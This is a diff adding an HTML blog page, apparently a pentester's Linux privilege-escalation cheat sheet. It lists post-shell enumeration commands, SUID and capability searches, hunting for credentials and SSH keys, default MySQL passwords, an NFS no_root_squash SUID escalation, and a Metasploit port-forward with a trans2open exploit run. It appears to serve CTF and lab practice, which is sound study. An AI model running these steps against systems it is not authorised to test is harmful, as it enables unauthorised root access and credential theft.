@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/utils.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/blogpost.css">
+    <title>Hi, I'm Notnue</title>
+    
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-98YN0J0PW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-98YN0J0PW4');
+</script>
+ 
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-N7HPXW3');</script>
+
+
+</head>
+<body>
+   
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N7HPXW3"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+
+    <nav class="navigation max-width-1 m-auto">
+        <h1 class="font1">Linux Privilege Escalation</h1>
+        <div class="nav-left">
+    </nav>
+    <div class="max-width-1 m-auto">
+        <hr>
+    </div>
+    <div class="m-auto blog-post-content max-width-2 m-auto my-2">
+
+         <p class="font1"><img src="img/rbash.jpeg" alt="article"><br>
+            <b>g0tmilk's Guide to Linux Privilege Escalation as well:</b><br>
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br>
+<br>
+I just got a low-priv shell !<br>
+<b>What would notnue do right now?</b><br>
+python -c 'import pty; pty.spawn("/bin/bash")'<br>
+OR<br>
+python3 -c 'import pty; pty.spawn("/bin/bash")'<br>
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp<br>
+export TERM=xterm-256color<br>
+alias ll='ls -lsaht --color=auto'<br>
+Ctrl + Z [Background Process]<br>
+stty raw -echo ; fg ; reset<br>
+stty columns 200 rows 200<br>
+<br>
+<br>
+Notnue would say:<br>
+Various Capabilities?<br>
+which gcc<br>
+which cc<br>
+which python<br>
+which perl<br>
+which wget<br>
+which curl<br>
+which fetch<br>
+which nc<br>
+which ncat<br>
+which nc.traditional<br>
+which socat<br>
+<br>
+<b>Compilation? (Very Back Burner)</b><br>
+file /bin/bash<br>
+uname -a<br>
+cat /etc/*-release<br>
+cat /etc/issue<br>
+<br>
+<br>
+<b>What Arch?</b><br>
+file /bin/bash<br>
+<br>
+<b>Kernel?</b><br>
+uname -a<br>
+<br>
+<b>Issue/Release?</b><br>
+cat /etc/issue<br>
+cat /etc/*-release<br>
+<br>
+<b>Are we a real user?</b><br>
+sudo -l<br>
+ls -lsaht /etc/sudoers<br>
+<br>
+<b>Are any users a member of exotic groups?</b><br>
+groups <user><br>
+    <br>
+    <br>
+Check out your shell's environment variables...<br>
+env<br>
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/<br>
+<br>
+<b>Users?</b><br>
+cd /home/<br>
+ls -lsaht<br>
+<br>
+<b>Web Configs containing credentials?</b><br>
+cd /var/www/html/<br>
+ls -lsaht<br>
+<br>
+<b>SUID Binaries?</b><br>
+find / -perm -u=s -type f 2>/dev/null<br>
+<br>
+<b>GUID Binaries?</b><br>
+find / -perm -g=s -type f 2>/dev/null<br>
+<br>
+SUID/GUID/SUDO Escalation:<br>
+https://gtfobins.github.io/<br>
+<br>
+Binary/Languages with "Effective Permitted" or "Empty Capability" (ep):<br>
+https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities<br>
+Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.<br>
+getcap -r / 2>/dev/null<br>
+<br>
+<br>
+We need to start monitoring the system if possible while performing our enumeration...<br>
+In other words:<br>
+"Notnue... Is privilege escalation going to come from some I/O file operations being done by some script on the system?"<br>
+https://github.com/DominicBreuker/pspy/blob/master/README.md<br>
+cd /var/tmp/<br>
+File Transfer --> pspy32<br>
+File Transfer --> pspy64<br>
+chmod 755 pspy32 pspy64<br>
+./pspy<32/64><br>
+<br>
+<b>What does the local network look like?</b><br>
+netstat -antup<br>
+netstat -tunlp<br>
+<br>
+<b>Is anything vulnerable running as root?</b><br>
+ps aux |grep -i 'root' --color=auto<br>
+<br>
+<b>MYSQL Credentials? Root Unauthorized Access?</b><br>
+mysql -uroot -p<br>
+Enter Password:<br>
+root : root<br>
+root : toor<br>
+root :<br>
+<br>
+Notnue would take a quick look at etc to see if any user-level people did special things:<br>
+cd /etc/<br>
+ls -lsaht<br>
+<b>Anything other than root here?</b><br>
+• Any config files left behind?<br>
+→ ls -lsaht |grep -i ‘.conf’ --color=auto<br>
+<br>
+• If we have root priv information disclosure - are there any .secret in /etc/ files?<br>
+→ ls -lsaht |grep -i ‘.secret’ --color=aut<br>
+<br>
+SSH Keys I can use perhaps for even further compromise?<br>
+ls -lsaR /home/<br>
+<br>
+Quick look in:<br>
+ls -lsaht /var/lib/<br>
+ls -lsaht /var/db/<br>
+<br>
+Quick look in:<br>
+ls -lsaht /opt/<br>
+ls -lsaht /tmp/<br>
+ls -lsaht /var/tmp/<br>
+ls -lsaht /dev/shm/<br>
+<br>
+<b>File Transfer Capability? What can I use to transfer files?</b><br>
+which wget<br>
+which curl<br>
+which nc<br>
+which fetch (BSD)<br>
+ls -lsaht /bin/ |grep -i 'ftp' --color=auto<br>
+<br>
+<b>NFS? Can we exploit weak NFS Permissions?</b><br>
+cat /etc/exports<br>
+no_root_squash?<br>
+https://recipeforroot.com/attacking-nfs-shares/<br>
+<br>
+[On Attacking Machine]<br>
+mkdir -p /mnt/nfs/<br>
+mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock<br>
+gcc suid.c -o suid<br>
+cp suid /mnt/nfs/<br>
+chmod u+s /mnt/nfs/suid<br>
+su <user id matching target machine's user-level privilege.><br>
+    <br>
+[On Target Machine]<br>
+user@host$ ./suid<br>
+#<br>
+<br>
+Where can I live on this machine? Where can I read, write and execute files?<br>
+/var/tmp/<br>
+/tmp/<br>
+/dev/shm/<br>
+<br>
+Any exotic file system mounts/extended attributes?<br>
+cat /etc/fstab<br>
+<br>
+Forwarding out a weak service for root priv (with meterpreter!):<br>
+Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.<br>
+https://www.offensive-security.com/metasploit-unleashed/portfwd/<br>
+<br>
+Forwarding out netbios-ssn EXAMPLE:<br>
+meterpreter> portfwd add –l 139 –p 139 –r [target remote host]<br>
+meterpreter> background<br>
+use exploit/linux/samba/trans2open<br>
+set RHOSTS 0.0.0.0<br>
+set RPORT 139<br>
+run<br>
+<br>
+Bob is a user on this machine. What is every single file he has ever created?<br>
+find / -user miguel 2>/dev/null<br>
+<br>
+Any mail? mbox in User $HOME directory?<br>
+cd /var/mail/<br>
+ls -lsaht<br>
+<br>
+Linpease:<br>
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS<br>
+<br>
+Traitor:<br>
+https://github.com/liamg/traitor<br>
+<br>
+GTFOBins:<br>
+https://gtfobins.github.io/<br>
+<br>
+PSpy32/Pspy64:<br>
+https://github.com/DominicBreuker/pspy/blob/master/README.md<br>
+</p>
+    </div>
+
+    <div class="max-width-1 m-auto"><hr></div>
+    <div class="home-articles max-width-1 m-auto font2">
+        <h2>People who read this also read</h2>
+        <div class="row">
+
+       
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/rbashhh.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/rbbash.html"><h3>Breaking out of a Restricted shell Why do I even care? You have to!! My end ...</h3></a>
+                
+                
+            </div>
+        </div>
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/goldeneye-hack7.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/golden.html"><h3>The intermediate level machine...</h3></a>
+                
+                
+            </div>
+        </div>
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/1111pm.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/headless.html"><h3>This VM Image is beginner friendly machine. The object of the game is to acq..</h3></a>
+                
+                
+            </div>
+        </div>
+        
+    </div>
+    </div>
+
+    
+</body>
+</html>
